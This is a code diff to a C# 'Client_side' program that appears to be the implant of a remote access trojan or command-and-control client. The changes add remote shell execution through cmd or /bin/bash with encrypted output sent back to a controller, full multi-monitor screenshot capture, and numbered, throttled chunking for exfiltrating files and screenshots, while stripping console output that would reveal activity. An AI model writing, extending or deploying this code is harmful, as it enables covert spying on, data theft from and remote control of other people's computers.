@@ -8,6 +8,7 @@ using System.Runtime.InteropServices;
 using System.Diagnostics.CodeAnalysis;
 using Microsoft.Win32.SafeHandles;
 using System.Drawing;
+using System.Drawing.Imaging;
 
 namespace Client_side
 {
@@ -63,22 +64,23 @@ namespace Client_side
 
                         // Send the file ID, file name and the number of chunks
                         string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
-                        Console.WriteLine(fileHeader);
                         byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                         NetworkLayer.SendResult(encryptedHeader);
 
                         // Send the file chunks
+                        int counter = 0;
                         foreach (string chunk in dumpChunks)
                         {
-                            byte[] formattedChunk = Encoding.UTF8.GetBytes($"{fileID}{delimiter}{chunk}");
+                            string formattedChunk = $"{fileID}{delimiter}{chunk}{delimiter}{counter}";
                             byte[] encryptedChunk = encryptor.Encrypt(formattedChunk);
                             NetworkLayer.SendResult(encryptedChunk);
+                            Thread.Sleep(10); // Sleep for 10ms to avoid packet loss
+                            counter++;
                         }
                         break;
                     }
                 case "5":
                     {
-                        Console.WriteLine("Taking screenshot...");
                         List<string> screenShotChunks = GetScreenShot();
                         string fileID = Guid.NewGuid().ToString();
                         string fileLength = screenShotChunks.Count.ToString();
@@ -86,21 +88,36 @@ namespace Client_side
 
                         // Send the file ID, file name and the number of chunks
                         string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
-                        Console.WriteLine(fileHeader);
                         byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                         NetworkLayer.SendResult(encryptedHeader);
 
                         // Send the file chunks
+                        int counter = 0;
                         foreach (string chunk in screenShotChunks)
                         {
-                            string formattedChunk = $"{fileID}{delimiter}{chunk}";
-                            Console.WriteLine(formattedChunk);
+                            string formattedChunk = $"{fileID}{delimiter}{chunk}{delimiter}{counter}";
                             byte[] encryptedChunk = encryptor.Encrypt(formattedChunk);
                             NetworkLayer.SendResult(encryptedChunk);
+                            Thread.Sleep(10); // Sleep for 10ms to avoid packet loss
+                            counter++;
                         }
                         break;
                     }
                 case "6":
+                    {
+                        string result = ExecuteCommand(commandParts[1]);
+                        byte[] encryptedResult = encryptor.Encrypt(result);
+                        NetworkLayer.SendResult(encryptedResult);
+                        break;
+                    }
+                case "7":
+                    {
+                        string result = ExecuteCommand(commandParts[1]);
+                        byte[] encryptedResult = encryptor.Encrypt(result);
+                        NetworkLayer.SendResult(encryptedResult);
+                        break;
+                    }
+                case "8":
                     {
                         NetworkLayer.SendResult(encryptor.Encrypt("Client - Logout"));
                         Environment.Exit(0);
@@ -115,23 +132,48 @@ namespace Client_side
         public static string ExecuteCommand(string command)
         {
             string result;
-            try
+            string os = Environment.OSVersion.ToString();
+            if (os.Contains("Windows"))
             {
-                ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + command);
-                procStartInfo.RedirectStandardOutput = true;
-                procStartInfo.UseShellExecute = false;
-                procStartInfo.CreateNoWindow = true;
-                Process proc = new()
+                try
                 {
-                    StartInfo = procStartInfo
-                };
-                proc.Start();
-                result = proc.StandardOutput.ReadToEnd();
+                    ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + command);
+                    procStartInfo.RedirectStandardOutput = true;
+                    procStartInfo.UseShellExecute = false;
+                    procStartInfo.CreateNoWindow = true;
+                    Process proc = new()
+                    {
+                        StartInfo = procStartInfo
+                    };
+                    proc.Start();
+                    result = proc.StandardOutput.ReadToEnd();
+                }
+                catch (Exception e)
+                {
+                    result = e.Message;
+                }
             }
-            catch (Exception e)
+            else
             {
-                result = e.Message;
+                try
+                {
+                    ProcessStartInfo procStartInfo = new ProcessStartInfo("/bin/bash", "-c " + command);
+                    procStartInfo.RedirectStandardOutput = true;
+                    procStartInfo.UseShellExecute = false;
+                    procStartInfo.CreateNoWindow = true;
+                    Process proc = new()
+                    {
+                        StartInfo = procStartInfo
+                    };
+                    proc.Start();
+                    result = proc.StandardOutput.ReadToEnd();
+                }
+                catch (Exception e)
+                {
+                    result = e.Message;
+                }
             }
+            
             return result;
         }
 
@@ -217,6 +259,20 @@ namespace Client_side
         [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
         public static extern IntPtr GetDesktopWindow();
 
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetWindowRect(IntPtr hWnd, ref Rect rect);
+
+        [DllImport("user32.dll")]
+        private static extern int GetSystemMetrics(int nIndex);
+
+        [DllImport("user32.dll")]
+        private static extern bool SetProcessDPIAware();
+
+        private const int SM_XVIRTUALSCREEN = 76;
+        private const int SM_YVIRTUALSCREEN = 77;
+        private const int SM_CXVIRTUALSCREEN = 78;
+        private const int SM_CYVIRTUALSCREEN = 79;
+
         [StructLayout(LayoutKind.Sequential)]
         private struct Rect
         {
@@ -226,12 +282,24 @@ namespace Client_side
             public int Bottom;
         }
 
-        [DllImport("user32.dll")]
-        private static extern IntPtr GetWindowRect(IntPtr hWnd, ref Rect rect);
-
         public static Image CaptureDesktop()
         {
-            return CaptureWindow(GetDesktopWindow());
+            SetProcessDPIAware();
+            int left = GetSystemMetrics(SM_XVIRTUALSCREEN);
+            int top = GetSystemMetrics(SM_YVIRTUALSCREEN);
+            int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+            int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+
+            // Calculate the total bounds of all screens
+            Rectangle bounds = new Rectangle(left, top, width, height);
+            Bitmap result = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
+
+            using (Graphics graphics = Graphics.FromImage(result))
+            {
+                graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
+            }
+
+            return result;
         }
 
         public static Bitmap CaptureActiveWindow()
@@ -253,13 +321,14 @@ namespace Client_side
 
             return result;
         }
+
         private static List<String> GetScreenShot()
         {
             List<string> chunks = new();
             Image screenShot = CaptureDesktop();
             using (MemoryStream ms = new())
             {
-                screenShot.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
+                screenShot.Save(ms, ImageFormat.Png);
                 byte[] imageBytes = ms.ToArray();
                 string imageBase64 = Encryptor.ConvertStr(imageBytes);
                 int chunkSize = 4096;
